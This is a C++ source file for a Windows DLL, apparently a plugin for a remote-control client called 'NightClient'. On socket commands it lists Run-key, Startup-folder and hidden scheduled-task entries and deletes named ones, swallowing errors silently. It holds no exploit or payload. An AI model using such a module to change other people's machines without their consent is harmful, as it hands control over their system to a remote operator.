#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <shlobj.h>
#include <initguid.h>
#include <taskschd.h>
#include <iostream>
#include "../../include/json.hpp"

using json = nlohmann::json;

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uuid.lib")

// Helper function to send JSON safely using the same mutex as the main client
void SendJSONSafe(SOCKET sock, const json& j) {
    if (sock == INVALID_SOCKET) return;

    std::string msg = j.dump() + "\r\n";
    std::string mutex_name = "Local\\NightClientSocketSendMutex_" + std::to_string(GetCurrentProcessId());
    HANDLE hMutex = CreateMutexA(NULL, FALSE, mutex_name.c_str());
    
    if (hMutex) {
        WaitForSingleObject(hMutex, INFINITE);
        send(sock, msg.c_str(), (int)msg.length(), 0);
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    } else {
        send(sock, msg.c_str(), (int)msg.length(), 0);
    }
}

// Read Registry Run Keys
void EnumRegistryRun(HKEY rootKey, const std::string& typeName, json& entries) {
    HKEY hKey;
    if (RegOpenKeyExA(rootKey, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char valueName[1024];
        char data[2048];
        DWORD valueNameSize = sizeof(valueName);
        DWORD dataSize = sizeof(data);
        DWORD type = 0;
        DWORD index = 0;

        while (RegEnumValueA(hKey, index, valueName, &valueNameSize, NULL, &type, (LPBYTE)data, &dataSize) == ERROR_SUCCESS) {
            if (type == REG_SZ || type == REG_EXPAND_SZ) {
                json entry;
                entry["name"] = std::string(valueName);
                entry["path"] = std::string(data);
                entry["type"] = typeName;
                entry["reg_key"] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; // root bilgisi typeName'den gelecek
                entries.push_back(entry);
            }
            valueNameSize = sizeof(valueName);
            dataSize = sizeof(data);
            index++;
        }
        RegCloseKey(hKey);
    }
}

// Read Startup Folder
void EnumStartupFolder(int csidl, const std::string& typeName, json& entries) {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, csidl, NULL, 0, path))) {
        std::string searchPath = std::string(path) + "\\*";
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    json entry;
                    entry["name"] = std::string(fd.cFileName);
                    entry["path"] = std::string(path) + "\\" + std::string(fd.cFileName);
                    entry["type"] = typeName;
                    entry["reg_key"] = "";
                    entries.push_back(entry);
                }
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }
}

// Read Task Scheduler
void EnumTaskScheduler(json& entries) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    bool coInit = SUCCEEDED(hr);

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (SUCCEEDED(hr)) {
        VARIANT varEmpty;
        VariantInit(&varEmpty);
        varEmpty.vt = VT_EMPTY;

        hr = pService->Connect(varEmpty, varEmpty, varEmpty, varEmpty);
        if (SUCCEEDED(hr)) {
            ITaskFolder* pRootFolder = NULL;
            BSTR rootStr = SysAllocString(L"\\");
            hr = pService->GetFolder(rootStr, &pRootFolder);
            SysFreeString(rootStr);
            
            if (SUCCEEDED(hr)) {
                IRegisteredTaskCollection* pTaskCollection = NULL;
                hr = pRootFolder->GetTasks(TASK_ENUM_HIDDEN, &pTaskCollection);
                if (SUCCEEDED(hr)) {
                    LONG numTasks = 0;
                    pTaskCollection->get_Count(&numTasks);
                    for (LONG i = 1; i <= numTasks; i++) {
                        IRegisteredTask* pRegisteredTask = NULL;
                        VARIANT varIndex;
                        VariantInit(&varIndex);
                        varIndex.vt = VT_I4;
                        varIndex.lVal = i;
                        hr = pTaskCollection->get_Item(varIndex, &pRegisteredTask);
                        if (SUCCEEDED(hr)) {
                            BSTR taskName = NULL;
                            pRegisteredTask->get_Name(&taskName);
                            if (taskName) {
                                int len = WideCharToMultiByte(CP_UTF8, 0, taskName, -1, NULL, 0, NULL, NULL);
                                if (len > 0) {
                                    std::vector<char> buf(len);
                                    WideCharToMultiByte(CP_UTF8, 0, taskName, -1, buf.data(), len, NULL, NULL);
                                    std::string s(buf.data());
                                    
                                    json entry;
                                    entry["name"] = s;
                                    entry["path"] = "Task Scheduler";
                                    entry["type"] = "Scheduled Task";
                                    entry["reg_key"] = "";
                                    entries.push_back(entry);
                                }
                                SysFreeString(taskName);
                            }
                            pRegisteredTask->Release();
                        }
                    }
                    pTaskCollection->Release();
                }
                pRootFolder->Release();
            }
        }
        pService->Release();
    }
    if (coInit) CoUninitialize();
}

// Remove Item
void DeleteStartupItem(SOCKET sock, const std::string& name, const std::string& type, const std::string& regKey) {
    bool success = false;
    std::string msg = "Unknown item type.";

    if (type == "Registry (HKLM)") {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regKey.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (RegDeleteValueA(hKey, name.c_str()) == ERROR_SUCCESS) {
                success = true;
                msg = "Deleted from HKLM successfully.";
            } else {
                msg = "Failed to delete value from HKLM.";
            }
            RegCloseKey(hKey);
        } else {
            msg = "Failed to open HKLM key.";
        }
    } else if (type == "Registry (HKCU)") {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, regKey.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (RegDeleteValueA(hKey, name.c_str()) == ERROR_SUCCESS) {
                success = true;
                msg = "Deleted from HKCU successfully.";
            } else {
                msg = "Failed to delete value from HKCU.";
            }
            RegCloseKey(hKey);
        } else {
            msg = "Failed to open HKCU key.";
        }
    } else if (type == "Startup Folder (User)") {
        char path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path))) {
            std::string fullPath = std::string(path) + "\\" + name;
            if (DeleteFileA(fullPath.c_str())) {
                success = true;
                msg = "File deleted successfully.";
            } else {
                msg = "Failed to delete file.";
            }
        }
    } else if (type == "Startup Folder (All Users)") {
        char path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_STARTUP, NULL, 0, path))) {
            std::string fullPath = std::string(path) + "\\" + name;
            if (DeleteFileA(fullPath.c_str())) {
                success = true;
                msg = "File deleted successfully.";
            } else {
                msg = "Failed to delete file.";
            }
        }
    } else if (type == "Scheduled Task") {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        bool coInit = SUCCEEDED(hr);
        ITaskService* pService = NULL;
        hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
        if (SUCCEEDED(hr)) {
            VARIANT varEmpty;
            VariantInit(&varEmpty);
            varEmpty.vt = VT_EMPTY;

            hr = pService->Connect(varEmpty, varEmpty, varEmpty, varEmpty);
            if (SUCCEEDED(hr)) {
                ITaskFolder* pRootFolder = NULL;
                BSTR rootStr = SysAllocString(L"\\");
                hr = pService->GetFolder(rootStr, &pRootFolder);
                SysFreeString(rootStr);
                
                if (SUCCEEDED(hr)) {
                    int wlen = MultiByteToWideChar(CP_UTF8, 0, name.c_str(), -1, NULL, 0);
                    if (wlen > 0) {
                        std::vector<wchar_t> wbuf(wlen);
                        MultiByteToWideChar(CP_UTF8, 0, name.c_str(), -1, wbuf.data(), wlen);
                        BSTR taskBstr = SysAllocString(wbuf.data());
                        hr = pRootFolder->DeleteTask(taskBstr, 0);
                        if (SUCCEEDED(hr)) {
                            success = true;
                            msg = "Scheduled Task deleted successfully.";
                        } else {
                            msg = "Failed to delete Scheduled Task.";
                        }
                        SysFreeString(taskBstr);
                    }
                    pRootFolder->Release();
                }
            }
            pService->Release();
        }
        if (coInit) CoUninitialize();
    }

    json response;
    response["action"] = "startup_delete_response";
    response["status"] = success ? "success" : "error";
    response["message"] = msg;
    SendJSONSafe(sock, response);
}

// Handle Command
extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    if (!commandJson || !sock) return;

    try {
        json command = json::parse(commandJson);
        std::string action = command.value("action", "");

        if (action == "startup_list") {
            json response;
            response["action"] = "startup_response";
            json entries = json::array();

            EnumRegistryRun(HKEY_LOCAL_MACHINE, "Registry (HKLM)", entries);
            EnumRegistryRun(HKEY_CURRENT_USER, "Registry (HKCU)", entries);
            EnumStartupFolder(CSIDL_STARTUP, "Startup Folder (User)", entries);
            EnumStartupFolder(CSIDL_COMMON_STARTUP, "Startup Folder (All Users)", entries);
            EnumTaskScheduler(entries);

            response["entries"] = entries;
            SendJSONSafe(sock, response);
        } 
        else if (action == "startup_delete") {
            std::string name = command.value("name", "");
            std::string type = command.value("type", "");
            std::string reg_key = command.value("reg_key", "");
            DeleteStartupItem(sock, name, type, reg_key);
        }
    } catch (...) {
        // Silently fail on errors
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
